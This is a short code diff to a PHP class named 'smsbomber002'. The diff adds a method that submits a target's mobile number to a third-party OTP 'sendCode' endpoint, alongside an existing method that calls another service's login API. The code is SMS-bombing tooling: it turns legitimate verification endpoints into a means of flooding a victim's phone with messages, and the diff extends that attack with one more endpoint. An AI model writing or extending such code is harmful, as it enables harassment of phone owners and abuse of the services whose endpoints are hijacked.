@@ -164,6 +164,13 @@ class smsbomber002 extends mbomber002
         return $this->s002("https://api.azkivam.com/auth/login", ["mobileNumber" => $this->$Number] );
       
     }
+
+
+    public function SbarghMan()
+    {
+        return $this->s002("https://uiapi2.saapa.ir/api/otp/sendCode", ["mobile" => $this->$Number] );
+      
+    }
   
 }
 
